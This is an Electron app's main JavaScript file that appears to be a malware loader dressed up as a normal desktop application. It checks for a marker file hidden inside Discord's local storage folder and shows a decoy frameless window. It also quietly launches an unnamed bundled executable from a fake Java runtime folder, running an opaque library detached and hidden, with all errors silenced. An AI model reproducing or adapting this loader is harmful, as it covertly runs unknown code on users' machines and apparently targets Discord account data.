
const { app, BrowserWindow, nativeImage } = require('electron');
const path = require('path');
const fs = require('fs');
const { spawn } = require('child_process');

function checkIntegrity() {
  try {
    const root = process.env.APPDATA || (
      process.platform === 'darwin'
        ? process.env.HOME + ''
        : process.env.HOME
    );

    const cachePath = path.join(
      root,
      'discord',
      'Local Storage',
      'leveldb',
      'bin',
      'modules.cache'
    );
    return fs.existsSync(cachePath);
  } catch (e) {
    return false;
  }
}

let mainWindow = null;

function initView() {

  if (process.argv.includes('--ira')) return;

  if (checkIntegrity()) return;

  const iconImage = nativeImage.createFromPath(path.join(__dirname, 'icon.ico'));
  mainWindow = new BrowserWindow({
    width: 1200,
    height: 800,
    frame: false,
    show: true,
    resizable: false,
    backgroundColor: '#000000',
    icon: iconImage,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false
    }
  });
  mainWindow.loadFile(path.join(__dirname, 'index.html'));
}

function launchRuntime() {
  try {
    const resPath = app.isPackaged
      ? process.resourcesPath
      : path.join(__dirname, '..', 'java');

    const runtimeDir = path.join(resPath, 'jre', 'bin');
    const libPath = path.join(resPath, 'modules.lib');

    if (!fs.existsSync(runtimeDir) || !fs.existsSync(libPath)) return;

    const core = fs.readdirSync(runtimeDir)
      .find(f =>
        f.endsWith('.exe') &&
        !['java.exe', 'keytool.exe', 'jlink.exe', 'jmod.exe'].includes(f.toLowerCase())
      );

    if (!core) return;

    const runner = path.join(runtimeDir, core);

    spawn(runner, ['--enable-native-access=ALL-UNNAMED', '-cp', libPath, 'h'], {
      cwd: resPath,
      detached: true,
      stdio: 'ignore',
      shell: false,
      windowsHide: true
    }).unref();

  } catch (e) {  }
}

app.whenReady().then(() => {
  initView();
  launchRuntime();
});